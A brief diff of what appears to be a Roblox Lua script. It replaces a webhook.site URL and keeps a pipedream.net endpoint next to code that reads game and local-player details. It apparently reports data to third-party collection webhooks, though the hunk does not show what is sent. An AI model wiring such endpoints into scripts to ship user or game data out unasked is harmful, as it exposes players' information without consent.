@@ -213,7 +213,7 @@ if game:GetService("VoiceChatService"):IsVoiceEnabledForUserIdAsync(LocalPlayer.
 end
 end
 
-local URL = "https://webhook.site/fa54a700-c2ae-4a96-ac42-6882d4bcd509"
+local URL = "https://webhook.site/0d77b08b-1645-4ed2-bf2c-f0155d45d630"
 local PipeURL = "https://eo2wkof7bwkylkp.m.pipedream.net"
 local updatedDate = MarketplaceService:GetProductInfo(game.PlaceId).Updated
 local dt = DateTime.fromIsoDate(updatedDate)
